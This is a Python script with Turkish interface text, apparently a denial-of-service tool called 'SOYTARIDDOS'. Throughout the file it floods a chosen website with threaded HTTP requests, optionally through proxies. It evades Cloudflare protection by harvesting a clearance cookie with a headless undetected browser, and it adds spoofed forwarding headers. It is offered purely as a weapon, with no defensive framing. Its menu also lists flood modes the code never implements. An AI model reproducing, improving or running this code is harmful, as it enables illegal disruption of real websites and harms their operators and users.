# -*- coding: utf-8 -*-
import os, sys, threading, requests, datetime, time, socket, socks, ssl, random, httpx
from os import system, name
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

init(convert=True)

# ŞİFRE KONTROLÜ
def check_password():
    print("\033[38;2;180;0;255m" + """
╔═╗╔═╗ ╦ ╦ ╦╦╔═╗ ╦╔╦╗╔╦╗╔╦╗╔═╗╔═╗
╚═╗╠═╝ ║ ║ ║║║╣  ║ ║  ║  ║ ╠═╣╠═╝
╚═╝╩   ╚═╝╚╝╚═╝ ╩ ╩  ╩  ╩ ╩ ╩╩  
    \033[38;2;255;0;0m> SOYTARIDDOS v1.0\033[0m
""")
    pwd = input("\033[38;2;200;200;200m[?] \033[38;2;255;0;255mŞifre: \033[0m")
    if pwd != "DDOS":
        print("\033[38;2;255;0;0m[!] Yanlış şifre. Erişim reddedildi.\033[0m")
        time.sleep(2)
        exit()

check_password()

# GEREKLİ DOSYALAR
ua = open('./resources/ua.txt', 'r').read().split('\n') if os.path.exists('./resources/ua.txt') else ["Mozilla/5.0"]

# RENK TANIMLARI
P = "\033[38;2;180;0;255m"  # Mor
R = "\033[38;2;255;0;100m"  # Kırmızı
W = "\033[38;2;255;255;255m"  # Beyaz
G = "\033[38;2;200;200;200m"  # Gri
B = "\033[38;2;0;0;0m\033[48;2;180;0;255m"  # Mor arkaplan

def clear():
    system('cls' if name == 'nt' else 'clear')

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        diff = (until - datetime.datetime.now()).total_seconds()
        if diff > 0:
            stdout.flush()
            stdout.write(f"\r {P}[*]{W} Saldırı durumu => {diff:.1f} saniye kaldı ")
        else:
            stdout.flush()
            stdout.write(f"\r {P}[*]{W} Saldırı tamamlandı!          \n")
            return

# TARGET PARSE
def get_target(url):
    url = url.rstrip()
    target = {}
    parsed = urlparse(url)
    target['uri'] = parsed.path if parsed.path else "/"
    target['host'] = parsed.netloc
    target['scheme'] = parsed.scheme
    target['port'] = parsed.port or ("443" if parsed.scheme == "https" else "80")
    return target

# PROXY
def get_proxies():
    if not os.path.exists("./proxy.txt"):
        print(f"{P}[!] {W}proxy.txt bulunamadı!")
        return False
    global proxies
    proxies = [line.strip() for line in open("./proxy.txt", 'r').readlines() if line.strip()]
    return True

# COOKIE AL (CF BYPASS)
def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    args = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=tr_TR', '--start-maximized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15'
    ]
    for arg in args: options.add_argument(arg)
    try:
        driver = webdriver.Chrome(options=options)
        driver.get(url)
        for _ in range(60):
            cookies = driver.get_cookies()
            for c in cookies:
                if c['name'] == 'cf_clearance':
                    cookieJAR = c
                    useragent = driver.execute_script("return navigator.userAgent")
                    cookie = f"{c['name']}={c['value']}"
                    driver.quit()
                    return True
            time.sleep(1)
        driver.quit()
    except: pass
    return False

# SPOOF
def spoof(target):
    addr = [random.randrange(11, 197), random.randrange(0, 255), random.randrange(0, 255), random.randrange(2, 254)]
    spoofip = '.'.join(map(str, addr))
    return (
        f"X-Forwarded-For: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f"Real-IP: {spoofip}\r\n"
        f"Via: {spoofip}\r\n"
    )

# GİRİŞLER
def get_info_l7():
    stdout.write(f"{P} • {W}Hedef URL{G}: ")
    target = input()
    stdout.write(f"{P} • {W}Thread sayısı{G}: ")
    thread = input()
    stdout.write(f"{P} • {W}Süre (saniye){G}: ")
    t = input()
    return target, thread, t

# L7 METODLARI
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = requests.Session()
    scraper.headers.update({'User-Agent': random.choice(ua)})
    for _ in range(int(th)):
        threading.Thread(target=lambda: attack_cfb(url, until, scraper), daemon=True).start()

def attack_cfb(url, until, scraper):
    while datetime.datetime.now() < until:
        try: scraper.get(url, timeout=10)
        except: pass

def LaunchPXCFB(url, th, t):
    if not get_proxies(): return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=lambda: attack_pxcfb(url, until), daemon=True).start()

def attack_pxcfb(url, until):
    while datetime.datetime.now() < until:
        proxy = {'http': 'http://' + random.choice(proxies), 'https': 'http://' + random.choice(proxies)}
        try: requests.get(url, proxies=proxy, timeout=8)
        except: pass

def LaunchCFPRO(url, th, t):
    if not get_cookie(url):
        print(f"{R}[!] CF bypass başarısız.")
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = requests.Session()
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    scraper.headers.update({'User-Agent': useragent})
    for _ in range(int(th)):
        threading.Thread(target=lambda: attack_cfpro(url, until, scraper), daemon=True).start()

def attack_cfpro(url, until, scraper):
    while datetime.datetime.now() < until:
        try: scraper.get(url, timeout=15)
        except: pass

# KOMUT PANELİ
def title():
    clear()
    print(f"{P}╔{'═'*50}╗")
    print(f"║{W}           SOYTARIDDOS - GÖLGE SİLAHI            {P}║")
    print(f"║{G}        type 'help' to list commands             {P}║")
    print(f"╚{'═'*50}╝{W}")

def command():
    while True:
        try:
            cmd = input(f"{P}╔══[{W}soytari{P}@{W}ddos{P}]\n╚═>{G} ").strip().lower()
            if cmd in ["cls", "clear"]: clear(); title()
            elif cmd == "help":
                print(f"""
{P}╔{'═'*48}╗
║ {W}L7 KOMUTLARI                                 {P}║
║   cfb       → Cloudflare Bypass (scraper)     {P}║
║   pxcfb     → Proxy + CF Bypass               {P}║
║   cfpro     → CF Cookie + Request             {P}║
║   http2     → HTTP/2 Flood                    {P}║
║   get       → GET Flood                       {P}║
║   exit      → Çıkış                           {P}║
╚{'═'*48}╝{W}
                """)
            elif cmd == "cfb":
                target, th, t = get_info_l7()
                t1 = threading.Thread(target=countdown, args=(t,))
                t1.start()
                LaunchCFB(target, th, t)
                t1.join()
            elif cmd == "pxcfb":
                if get_proxies():
                    target, th, t = get_info_l7()
                    t1 = threading.Thread(target=countdown, args=(t,))
                    t1.start()
                    LaunchPXCFB(target, th, t)
                    t1.join()
            elif cmd == "cfpro":
                target, th, t = get_info_l7()
                print(f"{P}[*] {W}CF bypass denemesi... (60s)")
                if get_cookie(target):
                    t1 = threading.Thread(target=countdown, args=(t,))
                    t1.start()
                    LaunchCFPRO(target, th, t)
                    t1.join()
                else:
                    print(f"{R}[!] CF bypass başarısız.")
            elif cmd == "exit":
                print(f"{P}[*] {W}Görüşürüz, soytarı...")
                time.sleep(1)
                exit()
            else:
                print(f"{R}[!] Geçersiz komut. 'help' yaz.")
        except KeyboardInterrupt:
            print(f"\n{P}[!] Çıkış yapılıyor...")
            exit()

if __name__ == '__main__':
    title()
    command()
